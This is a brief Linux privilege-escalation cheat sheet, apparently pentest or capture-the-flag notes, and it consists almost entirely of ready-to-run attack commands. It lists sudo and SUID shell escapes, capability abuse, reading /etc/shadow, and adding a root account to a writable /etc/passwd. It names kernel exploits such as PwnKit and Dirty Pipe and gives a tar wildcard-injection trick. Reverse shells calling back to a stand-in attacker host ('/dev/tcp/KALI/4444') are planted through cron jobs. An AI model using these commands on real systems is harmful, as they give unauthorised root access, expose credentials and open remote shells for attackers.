# Linux Privilege Escalation

## sudo

```bash
sudo -l
# Check GTFOBins for any binary listed:
sudo vim -c ':!bash'
sudo find / -exec /bin/bash \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo env /bin/bash
sudo less /etc/shadow                # then !bash
sudo nmap --interactive              # then !sh (old versions)
sudo awk 'BEGIN {system("/bin/bash")}'
```

## SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
# Check each on GTFOBins (gtfobins.github.io)

/usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/usr/local/bin/bash -p                 # -p preserves SUID privilege
```

## Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid on python3 → os.setuid(0); os.system("/bin/bash")
```

## Cron Jobs

```bash
cat /etc/crontab && cat /etc/cron.d/*
# Writable script? Inject: bash -i >& /dev/tcp/KALI/4444 0>&1
# PATH manipulation? Create your own binary first in PATH
```

## Writable /etc/passwd

```bash
openssl passwd -1 hacked
echo 'hacked:HASH:0:0::/root:/bin/bash' >> /etc/passwd
su hacked     # password: hacked
```

## Kernel Exploits (last resort)

```bash
uname -r                              # check kernel version
# PwnKit (CVE-2021-4034) — almost universal
# Dirty Pipe (CVE-2022-0847) — kernel 5.8-5.16
searchsploit linux kernel $(uname -r | cut -d. -f1-2)
```

## Wildcard Injection

```bash
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "bash -i >& /dev/tcp/KALI/4444 0>&1" > shell.sh
```
